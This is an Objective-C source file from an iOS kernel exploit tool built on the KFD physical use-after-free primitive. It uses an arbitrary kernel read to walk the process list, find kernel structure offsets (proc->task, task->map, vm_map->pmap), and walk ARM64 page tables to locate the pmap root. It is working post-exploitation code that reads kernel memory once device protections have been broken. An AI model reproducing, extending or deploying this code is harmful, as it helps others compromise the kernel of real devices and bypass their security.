//
//  MFCalibrate.m -- KFD page-table direct read: offset calibration (runs in-app)
//
//  Hard-earned rules baked into this file:
//    1. Every kernel read is validated against the kernel VA window first.
//       (A previous version passed a user address as kaddr -> copy_validate panic.)
//    2. All 64-bit values are assembled from two 32-bit reads, because the
//       sem_open primitive only guarantees 4 bytes per read.
//    3. Structure scans stay inside the object window (0x200 for proc/vm_map).
//    4. Candidates are only *compared* against known pointers, never dereferenced.
//    5. The pmap root field is verified by walking to our own Mach-O header and
//       checking for 0xfeedfacf -- a self-verifying test, not a guess.
//    6. mf_kclose() always runs, even on failure.
//
#import "MFCalibrate.h"
#import "MFKernelBridge.h"
#import <mach-o/dyld.h>
#include <stdbool.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>

/* ---------------- address guards ---------------- */

#define MF_KADDR_MIN 0xfffffe0000000000ULL
#define MF_KADDR_MAX 0xfffffff000000000ULL

static inline bool mf_is_kaddr(uint64_t a)
{
    return a >= MF_KADDR_MIN && a < MF_KADDR_MAX;
}

/* 16 KB page geometry (T8112 / T1SZ_BOOT = 17) */
#define MF_PG_SHIFT  14ULL
#define MF_PG_SIZE   (1ULL << MF_PG_SHIFT)
#define MF_PG_OFF(v) ((uint64_t)(v) & (MF_PG_SIZE - 1ULL))
#define MF_PA_MASK   0x0000FFFFFFFFC000ULL
#define MF_L1_IDX(v) (((uint64_t)(v) >> 36) & 0x7FFULL)
#define MF_L2_IDX(v) (((uint64_t)(v) >> 25) & 0x7FFULL)
#define MF_L3_IDX(v) (((uint64_t)(v) >> 14) & 0x7FFULL)
#define MF_DESC_T(d) ((uint64_t)(d) & 0x3ULL)
#define MF_L1_BLOCK  (1ULL << 36)
#define MF_L2_BLOCK  (1ULL << 25)

typedef struct {
    uint64_t kernel_proc, kernel_task;
    uint64_t current_proc, current_task;
    uint64_t current_map, current_pmap;
    uint64_t gVirtBase, gPhysBase, gPhysSize;
} mf_kaddr_t;

static mf_kaddr_t g_k;

/* ---------------- safe reads ---------------- */

static bool k32(uint64_t a, uint32_t *out)
{
    if (!out || !mf_is_kaddr(a)) return false;
    return mf_kread32(a, out) == 0;
}

static bool k64(uint64_t a, uint64_t *out)
{
    uint32_t lo = 0, hi = 0;
    if (!out || !mf_is_kaddr(a)) return false;
    if (!k32(a, &lo)) return false;
    if (!k32(a + 4, &hi)) return false;
    *out = ((uint64_t)hi << 32) | lo;
    return true;
}

static bool pa_in_range(uint64_t pa, uint64_t len)
{
    if (g_k.gPhysSize == 0 || pa < g_k.gPhysBase) return false;
    uint64_t off = pa - g_k.gPhysBase;
    return off < g_k.gPhysSize && len <= g_k.gPhysSize - off;
}

static bool pa_to_kva(uint64_t pa, uint64_t *kva)
{
    if (!kva || !pa_in_range(pa, 1)) return false;
    *kva = g_k.gVirtBase + (pa - g_k.gPhysBase);
    return mf_is_kaddr(*kva);
}

/* ---------------- page-table walk ---------------- */

static bool read_pte(uint64_t table_pa, uint64_t idx, uint64_t *pte)
{
    if (table_pa & (MF_PG_SIZE - 1ULL)) return false;
    if (idx >= (MF_PG_SIZE / sizeof(uint64_t))) return false;
    uint64_t pa = table_pa + idx * sizeof(uint64_t);
    uint64_t kva = 0;
    if (!pa_to_kva(pa, &kva)) return false;
    return k64(kva, pte);
}

/* root is always passed as a PHYSICAL address, so there is no PA/KVA ambiguity */
static bool va_to_pa(uint64_t root_pa, uint64_t va, uint64_t *pa_out)
{
    uint64_t d = 0;
    if (!pa_out) return false;
    *pa_out = 0;

    if (!read_pte(root_pa, MF_L1_IDX(va), &d)) return false;
    switch (MF_DESC_T(d)) {
        case 0x1:  /* L1 block: 64 GiB */
            *pa_out = (d & MF_PA_MASK & ~(MF_L1_BLOCK - 1ULL)) + (va & (MF_L1_BLOCK - 1ULL));
            return pa_in_range(*pa_out, 1);
        case 0x3:
            break;
        default:
            return false;
    }

    if (!read_pte(d & MF_PA_MASK, MF_L2_IDX(va), &d)) return false;
    switch (MF_DESC_T(d)) {
        case 0x1:  /* L2 block: 32 MiB */
            *pa_out = (d & MF_PA_MASK & ~(MF_L2_BLOCK - 1ULL)) + (va & (MF_L2_BLOCK - 1ULL));
            return pa_in_range(*pa_out, 1);
        case 0x3:
            break;
        default:
            return false;
    }

    if (!read_pte(d & MF_PA_MASK, MF_L3_IDX(va), &d)) return false;
    if (MF_DESC_T(d) != 0x3) return false;   /* L3 must be a page descriptor */

    *pa_out = (d & MF_PA_MASK) + MF_PG_OFF(va);
    return pa_in_range(*pa_out, 1);
}

/* walk-based user read; used only for the self-verification step */
static bool kread_user(uint64_t root_pa, uint64_t uva, void *dst, size_t n)
{
    uint8_t *p = (uint8_t *)dst;
    size_t done = 0;
    while (done < n) {
        uint64_t pa = 0;
        if (!va_to_pa(root_pa, uva + done, &pa)) return false;
        uint64_t kva = 0;
        if (!pa_to_kva(pa, &kva)) return false;
        uint32_t v = 0;
        if (!k32(kva, &v)) return false;
        size_t take = (n - done < 4) ? (n - done) : 4;
        memcpy(p + done, &v, take);
        done += take;
    }
    return true;
}

/* ---------------- scan helper ---------------- */

static int scan_u64(uint64_t base, uint64_t size, uint64_t target, uint64_t *hits, int max_hits)
{
    int n = 0;
    for (uint64_t off = 0; off + 8 <= size; off += 8) {
        uint64_t v = 0;
        if (!k64(base + off, &v)) break;
        if (v == target) {
            if (n < max_hits) hits[n] = off;
            n++;
        }
    }
    return n;
}

/* ---------------- main ---------------- */

static NSString *run_locked(NSMutableDictionary *json)
{
    NSMutableString *log = [NSMutableString string];

    /* 0) snapshot of g_kfd */
    if (mf_kaddr_snapshot(&g_k.kernel_proc, &g_k.kernel_task, &g_k.current_proc,
                          &g_k.current_task, &g_k.current_map, &g_k.current_pmap,
                          &g_k.gVirtBase, &g_k.gPhysBase, &g_k.gPhysSize) != 0) {
        return @"FAIL: no g_kfd snapshot (kernel not open, or bridge patch missing)";
    }
    [log appendFormat:@"kaddr kproc=%#llx ktask=%#llx\n", (unsigned long long)g_k.kernel_proc, (unsigned long long)g_k.kernel_task];
    [log appendFormat:@"      cproc=%#llx ctask=%#llx\n", (unsigned long long)g_k.current_proc, (unsigned long long)g_k.current_task];
    [log appendFormat:@"      cmap=%#llx cpmap=%#llx\n", (unsigned long long)g_k.current_map, (unsigned long long)g_k.current_pmap];
    [log appendFormat:@"perf  vbase=%#llx pbase=%#llx psize=%#llx\n", (unsigned long long)g_k.gVirtBase, (unsigned long long)g_k.gPhysBase, (unsigned long long)g_k.gPhysSize];

    if (!mf_is_kaddr(g_k.kernel_proc) || !mf_is_kaddr(g_k.kernel_task) ||
        !mf_is_kaddr(g_k.current_proc) || !mf_is_kaddr(g_k.current_task) ||
        !mf_is_kaddr(g_k.current_map) || !mf_is_kaddr(g_k.current_pmap) ||
        !mf_is_kaddr(g_k.gVirtBase)) {
        return [log stringByAppendingString:@"FAIL: some address is outside the kernel VA window (refusing to continue)"];
    }

    /* 1) allproc: p_list.le_next at +0x0, p_pid at +0x60 */
    uint64_t self_proc = 0;
    uint64_t cur = g_k.kernel_proc;
    int walked = 0;
    for (int i = 0; i < 4000 && cur; i++) {
        uint32_t pid = 0;
        if (!k32(cur + 0x60, &pid)) break;
        walked++;
        if (pid == (uint32_t)getpid()) { self_proc = cur; break; }
        uint64_t next = 0;
        if (!k64(cur, &next) || next == 0) break;
        cur = next;
    }
    [log appendFormat:@"allproc walked=%d self_proc=%#llx (current_proc=%#llx)\n",
        walked, (unsigned long long)self_proc, (unsigned long long)g_k.current_proc];
    if (!self_proc) return [log stringByAppendingString:@"FAIL: self not found in allproc"];

    json[@"self_proc"] = @(self_proc);
    json[@"proc_walk_count"] = @(walked);

    /* 2) proc->task: unique field in the first 0x200 bytes equal to current_task */
    uint64_t hits[16] = {0};
    int n = scan_u64(self_proc, 0x200, g_k.current_task, hits, 16);
    [log appendString:@"proc->task candidates:"];
    for (int i = 0; i < n && i < 16; i++) [log appendFormat:@" %#llx", (unsigned long long)hits[i]];
    [log appendFormat:@"  (count=%d)\n", n];
    if (n <= 0) return [log stringByAppendingString:@"FAIL: proc->task not found"];

    uint64_t proc_task_off = hits[0];

    /* 3) verify task->map == current_map */
    uint64_t mapv = 0;
    bool map_ok = k64(g_k.current_task + 0x28, &mapv) && (mapv == g_k.current_map);
    [log appendFormat:@"task+0x28 -> %#llx  %s\n", (unsigned long long)mapv, map_ok ? "OK == current_map" : "MISMATCH"];
    if (!map_ok) return [log stringByAppendingString:@"FAIL: task->map offset 0x28 wrong"];

    /* 4) vm_map->pmap */
    n = scan_u64(g_k.current_map, 0x200, g_k.current_pmap, hits, 16);
    [log appendString:@"vm_map->pmap candidates:"];
    for (int i = 0; i < n && i < 16; i++) [log appendFormat:@" %#llx", (unsigned long long)hits[i]];
    [log appendFormat:@"  (count=%d)\n", n];
    if (n <= 0) return [log stringByAppendingString:@"FAIL: vm_map->pmap not found"];
    uint64_t vm_map_pmap_off = hits[0];

    /* 5) pmap root field: self-verify against our own Mach-O header */
    const uint64_t self_macho = (uint64_t)(uintptr_t)_dyld_get_image_header(0);
    [log appendFormat:@"self Mach-O @ %#llx (expect 0xfeedfacf)\n", (unsigned long long)self_macho];

    uint64_t root_off = 0, root_pa = 0;
    const char *semantics = "";
    for (uint64_t off = 0; off + 8 <= 0x400 && !root_pa; off += 8) {
        uint64_t cand = 0;
        if (!k64(g_k.current_pmap + off, &cand) || cand == 0) continue;

        uint64_t cand_pa[2] = { cand, 0 };
        if (mf_is_kaddr(cand) && cand >= g_k.gVirtBase) {
            cand_pa[1] = cand - g_k.gVirtBase + g_k.gPhysBase;
        }

        for (int k = 0; k < 2; k++) {
            uint64_t pa = cand_pa[k];
            if (pa == 0 || (pa & (MF_PG_SIZE - 1ULL)) != 0) continue;
            if (!pa_in_range(pa, MF_PG_SIZE)) continue;

            uint32_t magic = 0;
            if (!kread_user(pa, self_macho, &magic, sizeof(magic))) continue;
            if (magic == 0xfeedfacfU) {
                root_off = off;
                root_pa = pa;
                semantics = (k == 0) ? "PA" : "physmap KVA";
                [log appendFormat:@"pmap root field: pmap+%#llx = %#llx (%s)\n",
                    (unsigned long long)off, (unsigned long long)cand, semantics];
                break;
            }
        }
    }
    if (!root_pa) return [log stringByAppendingString:@"FAIL: no pmap root field passed the self-verification"];

    /* 6) results */
    json[@"proc_task_off"] = @(proc_task_off);
    json[@"task_map_off"] = @((uint64_t)0x28);
    json[@"vm_map_pmap_off"] = @(vm_map_pmap_off);
    json[@"pmap_root_off"] = @(root_off);
    json[@"pmap_root_pa"] = @(root_pa);
    json[@"self_macho"] = @(self_macho);
    json[@"self_check"] = @"0xfeedfacf";

    [log appendFormat:@"\nRESULT\n  proc->task      = %#llx\n  task->map       = %#llx\n"
                       "  vm_map->pmap    = %#llx\n  pmap root field = %#llx\n  root PA         = %#llx\n",
        (unsigned long long)proc_task_off, (unsigned long long)0x28,
        (unsigned long long)vm_map_pmap_off, (unsigned long long)root_off,
        (unsigned long long)root_pa];
    return log;
}

NSString *MFCalibrateRun(NSString *jsonPath)
{
    if (!mf_is_open()) {
        return @"FAIL: kernel not open -- press 'start kernel' first";
    }

    NSMutableDictionary *json = [NSMutableDictionary dictionary];
    NSString *report = nil;

    @try {
        report = run_locked(json);
    } @finally {
        /* Always release: dangling PUAF pages panic the kernel when the process exits */
        mf_kclose();
        json[@"closed"] = @(!mf_is_open());
    }

    if (jsonPath.length) {
        NSData *d = [NSJSONSerialization dataWithJSONObject:json
                                                    options:NSJSONWritingPrettyPrinted
                                                      error:NULL];
        [d writeToFile:jsonPath atomically:YES];
    }
    return report ?: @"FAIL: unknown";
}
